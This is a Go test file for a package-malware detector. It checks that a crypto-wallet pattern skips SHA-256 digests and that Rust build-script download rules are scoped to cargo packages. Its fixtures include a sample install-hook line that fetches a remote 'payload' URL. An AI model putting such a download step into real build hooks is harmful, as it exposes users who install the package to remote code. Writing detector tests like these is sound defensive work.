package detect

import (
	"strings"
	"testing"
)

func TestCryptoWalletPatternDoesNotMatchSHA256Prefix(t *testing.T) {
	// The old bech32 branch had no trailing boundary, so a 64-character digest
	// beginning with bc1 matched its first 62 characters as a Bitcoin address.
	sha256 := "bc1" + strings.Repeat("a", 61)
	findings := Detect(&PackageContext{
		Name:            "legitimate-package",
		Ecosystem:       "pypi",
		PkgbuildContent: "sha256=" + sha256,
	})

	assertFindingAbsent(t, findings, "P-CRYPTO-WALLET")
}

func TestCargoBuildDownloadPatternRequiresRustHTTPClient(t *testing.T) {
	// A generic URL ending in .sh appears in ordinary npm metadata and is not
	// evidence that a Rust build script downloads and executes anything.
	findings := Detect(&PackageContext{
		Name:                 "legitimate-package",
		Ecosystem:            "npm",
		InstallScriptContent: `{"homepage":"https://example.com/setup.sh"}`,
	})
	assertFindingAbsent(t, findings, "P-CARGO-BUILD-DOWNLOAD")

	// Keep the behavior the rule is named for: a Rust HTTP client making a
	// request from an install/build hook.
	findings = Detect(&PackageContext{
		Name:                 "suspicious-package",
		Ecosystem:            "cargo",
		InstallScriptContent: `let body = reqwest::blocking::get("https://example.invalid/payload")?;`,
	})
	assertFindingPresent(t, findings, "P-CARGO-BUILD-DOWNLOAD")
}

func assertFindingAbsent(t *testing.T, findings []Finding, id string) {
	t.Helper()
	for _, finding := range findings {
		if finding.ID == id {
			t.Fatalf("unexpected %s finding on %q", id, finding.MatchedLine)
		}
	}
}

func assertFindingPresent(t *testing.T, findings []Finding, id string) {
	t.Helper()
	for _, finding := range findings {
		if finding.ID == id {
			return
		}
	}
	t.Fatalf("expected %s finding, got %v", id, ids(findings))
}

// A rule written for one language must not judge another. Without ecosystem
// scoping the Rust build.rs rules ran against npm packuments, which is how
// chalk and thirteen other npm packages were reported as malware.
func TestCargoRulesDoNotApplyToNpm(t *testing.T) {
	rust := `let body = reqwest::blocking::get("https://example.com/x")?;`

	npm := Detect(&PackageContext{
		Name: "legit", Ecosystem: "npm", InstallScriptContent: rust,
	})
	assertFindingAbsent(t, npm, "P-CARGO-BUILD-DOWNLOAD")

	// ...but it must still fire where it belongs.
	cargo := Detect(&PackageContext{
		Name: "evil", Ecosystem: "cargo", InstallScriptContent: rust,
	})
	found := false
	for _, f := range cargo {
		if f.ID == "P-CARGO-BUILD-DOWNLOAD" {
			found = true
		}
	}
	if !found {
		t.Error("P-CARGO-BUILD-DOWNLOAD must still fire for cargo")
	}

	// An unscoped rule is unaffected, and an unknown ecosystem still runs
	// everything rather than silently skipping detection.
	any := Detect(&PackageContext{
		Name: "evil", Ecosystem: "", InstallScriptContent: rust,
	})
	found = false
	for _, f := range any {
		if f.ID == "P-CARGO-BUILD-DOWNLOAD" {
			found = true
		}
	}
	if !found {
		t.Error("an unspecified ecosystem must not disable scoped rules")
	}
}
